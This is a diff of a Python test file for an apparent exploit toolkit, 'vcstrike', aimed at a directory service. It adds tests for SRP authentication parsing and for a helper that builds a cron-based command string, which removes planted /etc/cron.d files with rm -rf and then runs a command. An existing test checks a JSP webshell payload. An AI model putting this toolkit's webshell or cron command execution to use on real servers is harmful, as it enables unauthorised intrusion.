@@ -5,7 +5,7 @@ from vcstrike.aes128 import AES128OFB, _aes128_expand, aes128_encrypt_block
 from vcstrike.berldap import ber_parse_tlv, op_search, op_add, op_modify, ber_children
 from vcstrike.srp59309 import (SRPLayer, parse_server_options,
                                decide_client_options, srp_frame, srp_s, srp_os,
-                               SRPUnpack)
+                               srp_mpi, parse_server_challenge, SRPUnpack)
 from vcstrike.syslog59310 import (build_rfc5424, traversal_app, traversal_host,
                                   WEBSHELL_JSP)
 from vcstrike.util import SHA1_EMPTY, i2b
@@ -96,6 +96,19 @@ class TestSRP(unittest.TestCase):
         with self.assertRaises(ValueError):
             B.unwrap(bytes(frame[4:]))
 
+    def test_parse_challenge_offsets(self):
+        from vcstrike.srp59309 import parse_server_challenge
+        N = (1 << 640) | 0xABCDEF01
+        B = (1 << 320) | 0x1234
+        salt = b"S" * 16
+        L = "mda=SHA-1,replay_detection"
+        core = srp_mpi(N) + srp_mpi(2) + srp_os(salt) + srp_mpi(B) + srp_s(L)
+        for prefix in (b"", b"\x00"):      # srp.c 带 0x00；vmdird 布局可能不带
+            N2, g2, salt2, B2, L2 = parse_server_challenge(prefix + core)
+            self.assertEqual((N2, g2, salt2, B2, L2.decode()), (N, 2, salt, B, L))
+        with self.assertRaises(ValueError):
+            parse_server_challenge(b"\x99" * 32)
+
     def test_m1_deterministic(self):
         import hashlib
         N = int("EEAF0AB9ADB38DD69C33F80AFA8FC5E86072618775FF3C0B9EA2314C9C256576"
@@ -136,6 +149,21 @@ class Test59310(unittest.TestCase):
     def test_webshell_payload(self):
         self.assertIn(b"ProcessBuilder", WEBSHELL_JSP)
         self.assertIn(b'request.getParameter', WEBSHELL_JSP)
+
+    def test_cron_one_shot(self):
+        from vcstrike.syslog59310 import cron_command
+        c = cron_command("id", "ab12")
+        self.assertEqual(c,
+                         'rm -rf "/etc/cron.d/cve59310ab12-syslog.log" '
+                         '"/etc/cron.d/cve59310ab12"; id')
+
+    def test_has_srp(self):
+        from vcstrike.berldap import has_srp
+        self.assertTrue(has_srp(["GSSAPI", "SRP"]))
+        self.assertTrue(has_srp(["GSSAPI SRP"]))   # vmdird 单值含空格形态
+        self.assertFalse(has_srp(["GSSAPI"]))
+        self.assertFalse(has_srp([]))
+        self.assertFalse(has_srp(None))
 
 
 if __name__ == "__main__":
